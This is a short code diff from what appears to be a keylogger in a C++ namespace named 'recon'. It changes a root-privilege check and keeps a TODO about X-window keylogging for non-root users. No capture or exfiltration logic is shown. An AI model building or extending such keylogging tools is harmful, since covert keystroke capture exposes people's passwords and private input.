@@ -432,7 +432,7 @@ namespace recon
             {
                 // TODO: Use X window system for keylogging if not root and in DE (does wayland change this
                 // behavior?)
-                if (!is_privileged_user())
+                if (!is_root())
                     log::fatal("Keylogger must be run as root");
 
 #ifdef LINUX
